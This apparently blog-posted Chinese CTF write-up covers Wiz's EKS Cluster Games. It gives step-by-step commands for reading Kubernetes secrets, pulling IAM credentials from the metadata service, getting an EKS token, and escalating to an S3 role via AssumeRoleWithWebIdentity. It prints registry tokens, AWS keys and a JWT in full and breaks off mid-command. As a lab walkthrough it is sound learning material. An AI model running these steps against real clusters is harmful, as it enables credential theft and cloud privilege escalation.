---

tags: Cloud Native Security News, k8s, aws
version: v0.1.2
changelog-v0.1.2: 发布至 石头的安全料理屋
changelog-v0.1.1: add publish suffix

---

# 云原生安全资讯: WIZ EKS Cluster Games CTF WriteUp
> WIZ 推出的 EKS CTF 挑战赛，有助于了解云厂商真实场景 K8S 集群服务安全问题（Amazon AWS、Alibaba Cloud、IBM Cloud等）

挑战以攻击者获取到一个低权限的 AWS EKS Pod 为前提进行，通过页面提供的 Web 终端来获取 flag（基于真实的 EKS 错误配置和安全问题）。 每个题目在不同权限的 K8S 命名空间中。

[CTF传送门](https://eksclustergames.com/)

## Challenge1 - **Secret Seeker**

> Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?
> 

```yaml
root@wiz-eks-challenge:~# kubectl config view
apiVersion: v1
clusters:
- cluster:
    certificate-authority: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    server: https://10.100.0.1
  name: localcfg
contexts:
- context:
    cluster: localcfg
    namespace: challenge1
    user: user
  name: localcfg
current-context: localcfg
kind: Config
preferences: {}
users:
- name: user
  user:
    token: REDACTED
```

当前命名空间为 challenge1 ，看看有什么权限

```bash
root@wiz-eks-challenge:~# kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
....
secrets                                         []                                    []                 [get list]
....
```

发现能 list 和 get secrets

```bash
root@wiz-eks-challenge:~# kubectl get secrets -n challenge1
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      20d
```

查看 `log-rotate` 即可获取 flag（需base64解码）

```yaml
root@wiz-eks-challenge:~# kubectl get secrets log-rotate -n challenge1 -o yaml
apiVersion: v1
data:
  flag: xxxxxx
kind: Secret
metadata:
  creationTimestamp: "2023-11-01T13:02:08Z"
  name: log-rotate
  namespace: challenge1
  resourceVersion: "890951"
  uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
type: Opaque
```

## Challenge2 - **Registry Hunt**

> A thing we learned during our research: always check the container registries.
> For your convenience, the **[crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md)** utility is already pre-installed on the machine.


rbac 权限为 list 和 get pod 以及 get secret，命名空间为 challenge2

```bash
kubectl config view # 得知用户的命名空间为 challenge2
kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names     Verbs
....
secrets                                         []                                    []                 [get]
pods                                            []                                    []                 [list get]
....
```

获取pod 信息

```yaml
root@wiz-eks-challenge:~# kubectl get pods -n challenge2 -o yaml
apiVersion: v1
....
  spec:
    containers:
    - image: eksclustergames/base_ext_image
....
    imagePullSecrets:
    - name: registry-pull-secrets-780bab1d
....
    containerStatuses:
    - containerID: containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af
      image: docker.io/eksclustergames/base_ext_image:latest
      imageID: docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
....
```

发现使用了镜像 secret `registry-pull-secrets-780bab1d` 

```yaml
root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:31:29Z"
  name: registry-pull-secrets-780bab1d
  namespace: challenge2
  resourceVersion: "897340"
  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
type: kubernetes.io/dockerconfigjson
```

得到镜像仓库认证信息：`eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo`

认证

```bash
root@wiz-eks-challenge:~# crane auth login docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
2023/11/22 08:21:37 logged in via /home/user/.docker/config.json
```

查看 pod 的镜像得到 flag

```bash
root@wiz-eks-challenge:~# crane config docker.io/eksclustergames/base_ext_image
{
....
      "created_by": "RUN sh -c echo 'wiz_eks_challenge{xxxxxx}' > /flag.txt # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
....
}
```


> 💡 We successfully used this technique in both of our engagements with **[Alibaba Cloud](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r)** and **[IBM Cloud](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)** to obtain internal container images and to prove unauthorized access to cross-tenant data.

## Challenge3 - **Image Inquisition**

> A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
> 
> 
> Remember: You are running inside a compromised EKS pod.
> 
> For your convenience, the **[crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md)** utility is already pre-installed on the machine.
> 

rbac 权限为 list 和 get pod，命名空间为 challenge3

```bash
kubectl config view
kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names     Verbs
....
pods                                            []                                    []                 [get list]
....
```

查看镜像信息发现没权限，这次镜像认证信息不在 pod yaml里

```bash
kubectl get pod -nchallenge3
kubectl get pod -nchallenge3 accounting-pod-876647f8 -oyaml
....
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@....

```

一般是存在 `/etc/docker/config.json` 或者 `~/.docker/config.json` ，但发现没有（如果有是因为上个题目存的

```bash
root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c
Error: fetching config: reading image "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c": GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/latest: unexpected status code 401 Unauthorized: Not Authorized
```

仔细看，发现这次的镜像不是在 docker 中，而是在 aws 里的，这个仓库又是私有仓库，找下文档 **[Private registry authentication](https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry_auth.html)**，需要通过 `aws ecr get-login-password` 获取登录密码，并且需要知道 `aws_account_id` 以及 `region`

```bash
aws ecr get-login-password --region <region> | docker login --username AWS --password-stdin <aws_account_id>.dkr.ecr.<region>.amazonaws.com
```

获取密码，但没有凭据

```bash
root@wiz-eks-challenge:~# aws ecr get-login-password

Unable to locate credentials. You can configure credentials by running "aws configure".
```

尝试在元数据里找找，可以找到

```bash
root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam
info
security-credentials/

root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials
eks-challenge-cluster-nodegroup-NodeInstanceRole

root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMV2IJHCPM","Expiration":"2023-11-22 10:45:03+00:00","SecretAccessKey":"+R3fAvkPYTLWqiKYb+XqXaADSuISCkCokNHEk9SE","SessionToken":"FwoGZXIvYXdzEOP//////////wEaDG8Bfxcx331RZt2mNiK3AYLXpk5SkSAAMXuak5Aem9A2TpwQ52ntiIgmKnAMlSwNzEnojODsnQLoJfJKG8Rd/05anaxcip7P71PyJ5DxajGUj1kkSXYyq+Bfr6X9FaD+wvq/OeF1EwI37lRrM3Y1ElliG14fz4BlJDOIZPu3L2C0BOYfgkKfEJZTxRwzuzxaWZmprnzKWcIeegOp2R4KayH7q3nWsNpEyC0gdJVPSDQg27V4rv3ifc+muTc0TEqIZndmNY+qICifm/eqBjItJWNoRnqf6lyJCmcut5w/8Vk5g3PX1HnYXzD0jFu8ofehCcGzD/qMUe3zpXVV"}
```

`region` 区域也可以通过 metadata 获取

```bash
curl http://169.254.169.254/latest/dynamic/instance-identity/document
{
....
  "region" : "us-west-1",
....
}
```

设置凭证

```bash
export AWS_ACCESS_KEY_ID=ASIA2AVYNEVMV2IJHCPM
export AWS_SECRET_ACCESS_KEY=+R3fAvkPYTLWqiKYb+XqXaADSuISCkCokNHEk9SE
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEOP//////////wEaDG8Bfxcx331RZt2mNiK3AYLXpk5SkSAAMXuak5Aem9A2TpwQ52ntiIgmKnAMlSwNzEnojODsnQLoJfJKG8Rd/05anaxcip7P71PyJ5DxajGUj1kkSXYyq+Bfr6X9FaD+wvq/OeF1EwI37lRrM3Y1ElliG14fz4BlJDOIZPu3L2C0BOYfgkKfEJZTxRwzuzxaWZmprnzKWcIeegOp2R4KayH7q3nWsNpEyC0gdJVPSDQg27V4rv3ifc+muTc0TEqIZndmNY+qICifm/eqBjItJWNoRnqf6lyJCmcut5w/8Vk5g3PX1HnYXzD0jFu8ofehCcGzD/qMUe3zpXVV"
export AWS_DEFAULT_REGION=us-west-1
```

然后请求即可获得仓库密码

```bash
root@wiz-eks-challenge:~# aws ecr get-login-password
eyJwYXlsb2FkIjoiYkNw....
```

还剩个 `aws_account_id` ，在官方文档可找到 [View Your Account ID using the AWS CLI](https://docs.aws.amazon.com/IAM/latest/UserGuide/console_account-alias.html)

得到 Account ID 为 688655246681

```bash
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

最后拼接上，因环境没有 `docker-cli`，换成 `crane` 即可

```bash
root@wiz-eks-challenge:~# aws ecr get-login-password --region us-west-1 | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
2023/11/22 14:49:42 logged in via /home/user/.docker/config.json
```

获取 flag

```bash
root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq
{
 ....
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{xxxxxx} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
 ....
}
```

突然发现，原来镜像id的host部分，就是由 `<aws_account_id>.dkr.ecr.<region>.amazonaws.com` 组成的，就不用特意去找 `aws_account_id` 和 `region` 了


> 💡 **In this challenge, you retrieved credentials from the Instance Metadata Service (IMDS). Moving forward, these credentials will be readily available in the pod for your ease of use.**

## Challenge4 - **Pod Break**

> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
> 
> Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

这次的sa没有任何权限

```bash
kubectl config view
kubectl auth can-i --list
```

```bash
root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMQCKPWBEC","Expiration":"2023-11-22 16:07:13+00:00","SecretAccessKey":"/7dSPXjY/S8zNyYLgRhRUraNUBL7mS7einm/+OHE","SessionToken":"FwoGZXIvYXdzEOn//////////wEaDCO+l5DL50cS40GvJCK3ASLmogQ9c8poFwtbvjAGzEdzfVvAYurSEgei7aeDVgh6KPcjbTZacyvJeGsaxzuPn6+tkPaRYoSKXEbr2vA9rpbc17JajJh3XeOddAN/Kfwdsix65xH0jtI/8q1kP7U7u0Sx0FmgMC0QTbSpfgeltiokHLiMvLJ3SOZfjW8woGzf6NsRazakxtGO0/wl9zdyU6kutS8uyd+JiR8dWs3zHmidZJLh5oWf77V9RdxL5i5wcdJooT/Y/yihsviqBjIt4nJReMLBWvi0bC0dz1ELT3nRQEclLc5uQp5L3hfFkWm/QlkRRT0VAA7W6NE1"}
```

通过 https://github.com/andresriancho/enumerate-iam 枚举一下权限 

```bash
python3 enumerate-iam.py --access-key ASIA2AVYNEVMQCKPWBEC --secret-key /7dSPXjY/S8zNyYLgRhRUraNUBL7mS7einm/+OHE --session-token "FwoGZXIvYXdzEOn//////////wEaDCO+l5DL50cS40GvJCK3ASLmogQ9c8poFwtbvjAGzEdzfVvAYurSEgei7aeDVgh6KPcjbTZacyvJeGsaxzuPn6+tkPaRYoSKXEbr2vA9rpbc17JajJh3XeOddAN/Kfwdsix65xH0jtI/8q1kP7U7u0Sx0FmgMC0QTbSpfgeltiokHLiMvLJ3SOZfjW8woGzf6NsRazakxtGO0/wl9zdyU6kutS8uyd+JiR8dWs3zHmidZJLh5oWf77V9RdxL5i5wcdJooT/Y/yihsviqBjIt4nJReMLBWvi0bC0dz1ELT3nRQEclLc5uQp5L3hfFkWm/QlkRRT0VAA7W6NE1"
```

并没有发现什么有用的权限，

```bash
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

尝试获取 eks token，集群名字根据 arn 命名猜 [->1](https://medium.com/@jason133337/eks-cluster-game-challenge-walkthrough-9110343c24ce) 、[->2](https://infrasec.sh/post/eks_cluster_game/)

```bash
root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2023-11-23T01:44:02Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1XR0pGVkpTSSUyRjIwMjMxMTIzJTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzExMjNUMDEzMDAyWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFUFAlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFES29RRXcyU0t3JTJCU0I1dkZNQ0szQVh0bjZ4Y2l3YUt1NDFLWk9QN3MlMkZoYmx5eUZYdXFpaHNuMUs3UiUyQldjUXRwWUc3aXpNQ0w1eXRMTWxyWXNrREVMUW9udzlyVHMyOVVneCUyQkpvY3k4R1JEVEJ0endPWFlzYjlHbmFqd2tVRDlGOTU1Qm5aOVp4bktPTlRrUWp4TGhRTDludjd5UHlyT0hVQmRIVUF1QVVnc1RIQU90SklKNDg4OThKOHMwYUppR2pBYU11TDVPNlAlMkJtR2JwSnJLTGxlTVN0VyUyRmtESTBaQTJEaW1ZWXElMkJaREJMT1hyQUglMkYlMkZxMkFwdUdLbnYxeUpjczZHSVA5akVQU2lLMVBxcUJqSXRvY3BJdGpPMUVQcEJURjZUdmdsTFNSNjl5TjNrUmtKVlA1JTJGSHA0T1JnRlVRcFc0OTFTM00ya1ZabFMyTSZYLUFtei1TaWduYXR1cmU9ODdkZjZlOGE5MzBmN2E2Mzk0M2M5MmMzY2NiY2QzMmQ4NDZkMjI1NDhkYThkMjUxZWZhNzNiMThmODJjZWJlZg"
    }
}
```

看看这个token的权限

```bash
root@wiz-eks-challenge:~# kubectl --token=$token auth can-i --list
Resources                                       Non-Resource URLs   Resource Names     Verbs
....
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
....
```

查看一下 sa 和 secret 信息，得到 flag

```bash
root@wiz-eks-challenge:~# kubectl --token=$token get sa
NAME                         SECRETS   AGE
default                      0         22d
service-account-challenge4   0         22d

root@wiz-eks-challenge:~# kubectl --token=$token get sa service-account-challenge4 -o yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: "2023-10-31T20:07:21Z"
  name: service-account-challenge4
  namespace: challenge4
  resourceVersion: "671862"
  uid: ad44848d-7b8d-4cc1-8e30-5b23c9a52c40

root@wiz-eks-challenge:~# kubectl --token=$token get secret
NAME        TYPE     DATA   AGE
node-flag   Opaque   1      21d

root@wiz-eks-challenge:~# kubectl --token=$token get secret node-flag -o yaml
apiVersion: v1
data:
  flag: xxxxx
kind: Secret
metadata:
  creationTimestamp: "2023-11-01T12:27:57Z"
  name: node-flag
  namespace: challenge4
  resourceVersion: "883574"
  uid: 26461a29-ec72-40e1-adc7-99128ce664f7
type: Opaque
```

> 💡 In this task, you've acquired the Node's service account credentials. For future reference, these credentials will be conveniently accessible in the pod for you.
> 
> Fun fact: The misconfiguration highlighted in this challenge is a common occurrence, and the same technique can be applied to any EKS cluster that doesn't enforce IMDSv2 hop limit.

## Challenge5 - **Container Secrets Infrastructure**

> You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the *s3access-sa* service account, and get the flag?
> 

题目 IAM Policy

```json
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```

Trust Policy

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```

rbac 权限

```json
{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```

存在 sa token 的创建权限

pod 和 secret 都是空的，存在 3个 sa，其中 debug-sa 和 s3access-sa 对应的 arn 定了 iam 角色，应该就是对应题目给的 IAM Policy 和 Trust Policy

```yaml
root@wiz-eks-challenge:~# kubectl get sa -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      description: This is a dummy service account with empty policy attached
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
    creationTimestamp: "2023-10-31T20:07:37Z"
    name: debug-sa
    namespace: challenge5
    resourceVersion: "671929"
    uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
....
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
    creationTimestamp: "2023-10-31T20:07:34Z"
    name: s3access-sa
    namespace: challenge5
    resourceVersion: "671916"
    uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
kind: List
metadata:
  resourceVersion: ""
```

EKS 和 IAM的使用和绑定可以见 **[IAM roles for service accounts](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html) ，发现**

> In 2014, AWS Identity and Access Management added support for federated identities using OpenID Connect (OIDC). This feature allows you to authenticate AWS API calls with supported identity providers and receive a valid OIDC JSON web token (JWT). You can pass this token to the AWS STS `AssumeRoleWithWebIdentity` API operation and receive IAM temporary role credentials. You can use these credentials to interact with any AWS service, including Amazon S3 and DynamoDB.
> 

也就是说，因为 sa 绑定了 iam 角色，如果他创建的token符合Trust Policy，那么就拥有该Trust Policy 绑定角色的权限，就可以通过 `AssumeRoleWithWebIdentity` 模拟请求了，不过我们创建不了 s3access-sa  的 sa token，只能创建 debug-sa 的

```bash
root@wiz-eks-challenge:~# kubectl create token s3access-sa --audience=sts.amazonaws.com     
error: failed to create token: serviceaccounts "s3access-sa" is forbidden: User "system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal" cannot create resource "serviceaccounts/token" in API group "" in the namespace "challenge5"

root@wiz-eks-challenge:~# kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
....

root@wiz-eks-challenge:~# kubectl create token debug-sa --audience=sts.amazonaws.com  
eyJhbGciOiJSUzI1NiIsImtpZCI6ImNkZDc0NmM4YzU4YmUwNzU0YjZiOTIyNTllOGI3MjljMTgyYTQxN2QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzAwNzE5OTE0LCJpYXQiOjE3MDA3MTYzMTQsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTcwMDcxNjMxNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.VxrPpaQe6TuvPWZbiJRVAj80jkdVmNZC_c23sPJXDezDwtV6qp4TmIuzxZEg_jD9Rw8qxxxqZPA1Q5P-07y3jDzXtdTUxnEY5v9t9Ug-2h_sLlNXZOBmvVxmhhK4v_EHyewPAllCPGU1hDkC3j73tgB64MLN5wADoULtQQEKDw0eeoW3y8NEDXAjZ0R6GnLxgL7WtnPopEkfgSEffNcnUjYP2hdeu_hTf2N7QO_syiMuLJD1bM16pllaoPj3WITB1WgvZtYP76w2PJqgfc-ECJisS3V8wTcfuYEQTLe8ZHZh9iDRmV0F--7w7M3x0RRUIELpNyNXZ_vCpf674vVpXg
```

注意 create token 需要加上 `--audience` 参数，因为 Trust Poliay 有做校验

解码得到

```json
{
    "aud": [
        "sts.amazonaws.com"
    ],
    "exp": 1700719914,
    "iat": 1700716314,
    "iss": "https://oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "kubernetes.io": {
        "namespace": "challenge5",
        "serviceaccount": {
            "name": "debug-sa",
            "uid": "6cb6024a-c4da-47a9-9050-59c8c7079904"
        }
    },
    "nbf": 1700716314,
    "sub": "system:serviceaccount:challenge5:debug-sa"
}
```

iss 部分和 Trust Policy 主体是一样的，模拟角色请求

```json
root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name challengeEksS3Role --web-identity-token "eyJhbGciOiJSUzI1NiIsImtpZCI6ImNkZDc0NmM4YzU4YmUwNzU0YjZiOTIyNTllOGI3MjljMTgyYTQxN2QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzAwNzE5OTE0LCJpYXQiOjE3MDA3MTYzMTQsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTcwMDcxNjMxNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.VxrPpaQe6TuvPWZbiJRVAj80jkdVmNZC_c23sPJXDezDwtV6qp4TmIuzxZEg_jD9Rw8qxxxqZPA1Q5P-07y3jDzXtdTUxnEY5v9t9Ug-2h_sLlNXZOBmvVxmhhK4v_EHyewPAllCPGU1hDkC3j73tgB64MLN5wADoULtQQEKDw0eeoW3y8NEDXAjZ0R6GnLxgL7WtnPopEkfgSEffNcnUjYP2hdeu_hTf2N7QO_syiMuLJD1bM16pllaoPj3WITB1WgvZtYP76w2PJqgfc-ECJisS3V8wTcfuYEQTLe8ZHZh9iDRmV0F--7w7M3x0RRUIELpNyNXZ_vCpf674vVpXg"

{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEVM4C77QZO4",
        "SecretAccessKey": "4EqNdaYZkSAuaeq5IpCAeZcCz84NPVvyuX7af4JE",
        "SessionToken": "IQoJb3JpZ2luX2VjEOX//////////wEaCXVzLXdlc3QtMSJHMEUCIQCQXgdnO95QFsRGfNRwl6FRIVODhv7DGCCgf0/F9NEccgIgS84dEX0b8BpoDTBVg8pPmXmajzc5tZduOJy9MLmXnN8qwwQIPhAAGgw2ODg2NTUyNDY2ODEiDEjC4s706SV4TskmoyqgBESIoDtEtMpUWuKfwXAblQrwNCnyE61pREL6ercqUSWSEaUPln5t5rgqIkO/OMT6P5TpLTg9yoJeGPqhBr2nyxV1h6wYwrN6VZ/yng4UWuM1517DBIIUtzdnG0UeoLSCL6sy1sEUnw3piiXYN8Ci6Sg4i1FY6rOinx2O0E63FSWBFW1QVpHAnhUWqWZSSackUvJugC6LcEXbZUxX0DVwjOZt+YCSlcEFVj9PbXKOU8P0K0tQ1bUGP5vvphy09v26+VQmOrePLcdsp36k52Ggb6wZmwe9xqMhyPsEs6Lxw+E1hqWhxDyte1j1GsJrei2C2F0iubHbgrXzkghIkJ4vDdmhosLpYSlFzFm5a02zRyM9OFZKpFYSw4I7PXv8eV4YwdKmUfdpX3WLuaIhTg7NeZz80hh4P+Oyto4P8OE2UhfYYFODG4TFPYs387o2wUef8aCLJzG+lWm+A30bEBGznotaTk92Tdx25CA53ehreNwwtupD0pTJqLVs8rfGTW+y1kxv/YnrPQ1GtPUexuYu2qX3EKq/0mQ6vwI/lC7RfiZeVF6/8n2eJmsqifL1FGlZO289zYNTMyZqsmEN6LqKZjxxDYoJ8TGDSMtkNMfEcGB3CK0YKdIOC1IHByg/dQkYK4jZjI0S848j3Twb9WzK1grcfGPvJpmndDRYGzYVgSCLCc5d2wW8Ou3JCXsnlQKKWBWiFlyHtLad9eDXeaxRa38wjL/7qgY6lQE2yuNQ1qBb/iNNCKsUmgUaoT2iWOKmjf2ULw0rCqjr2fFHxLDAYStKoEIJh5caiNmhe7MrcOonzvr5TTWuaLHpwJLa7LinIF0DE14FvZkva/lXLikrskw1pn9Ntsc/RPMn7/M22kBKtbz5XuVJJXHt9x6cMqD+UVdNV1K0Ioro3aOwXM1lgxqlhzUiAEbWPLypuOr9qQ==",
        "Expiration": "2023-11-23T06:13:48+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:challengeEksS3Role",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/challengeEksS3Role"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}
```

设置这个 token 再去请求 s3 即可

```bash
export AWS_ACCESS_KEY_ID=ASIA2AVYNEVM4C77QZO4
export AWS_SECRET_ACCESS_KEY=4EqNdaYZkSAuaeq5IpCAeZcCz84NPVvyuX7af4JE
